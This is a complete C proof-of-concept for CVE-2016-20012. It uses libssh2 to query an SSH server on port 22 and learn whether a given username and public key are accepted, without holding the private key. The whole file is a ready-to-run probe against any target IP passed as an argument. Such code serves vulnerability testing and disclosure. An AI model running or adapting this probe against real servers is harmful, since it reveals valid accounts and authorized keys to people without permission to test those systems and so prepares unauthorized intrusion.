#include <stdio.h>
#include <errno.h>
#include <libssh2.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(int argc, char** argv) {
  int rc = 0;
  libssh2_socket_t sock = 0;
  LIBSSH2_SESSION *session = NULL;

  if(argc != 4) {
    printf("Usage: ./poc <username> <public-key> <target>\n");
    return -1;
  }

  rc = libssh2_init(0);

  if(rc != 0) {
    printf("Failed to initialize libssh.\n");
    return -1;
  }

  sock = socket(AF_INET, SOCK_STREAM, 0);

  if(sock == -1) {
    printf("Failed to create socket: %d.\n", errno);
    rc = -1;
    goto quit;
  }

  struct sockaddr_in sin;

  sin.sin_family = AF_INET;
  sin.sin_port = htons(22);
  sin.sin_addr.s_addr = inet_addr(argv[3]);

  /* TCP handshake */
  if(connect(sock, (struct sockaddr*)(&sin), sizeof(struct sockaddr_in))) {
    printf("Failed to connect: %d.\n", errno);
    rc = -1;
    goto quit;
  }

  session = libssh2_session_init();

  if(session == NULL) {
    printf("Failed to initialize SSH session.\n");
    goto quit;
  }

  /* SSH handshake */
  rc = libssh2_session_handshake(session, sock);

  if(rc < 0) {
    printf("Failure during SSH handshake: %d.\n", rc);
    goto quit;
  }

  /* Send an SSH_MSG_USERAUTH_REQUEST request */
  /* No private key is sent because we do not need to be authenticated */
  /* We just need to know if the pair username/public key is known */
  rc = libssh2_userauth_publickey_fromfile(session, argv[1], argv[2], NULL, NULL);

  if(rc == LIBSSH2_ERROR_PUBLICKEY_UNRECOGNIZED) {
    printf("Either the server is not vulnerable to CVE-2016-20012, or the combination of the given username and public key is unknown by the server.\n");
    rc = 1;
  } else if(rc == LIBSSH2_ERROR_PUBLICKEY_UNVERIFIED) {
    /* The public key is unverified because we do not provide the private key */
    printf("The username '%s' and the public key '%s' are known by the server.\n", argv[1], argv[2]);
    rc = 0;
  } else {
    printf("Unknown error during public key authentication: %d.", rc);
  }

quit:
  if(session)
     libssh2_session_free(session);

  if(sock)
    close(sock);

  libssh2_exit();

  return rc;
}
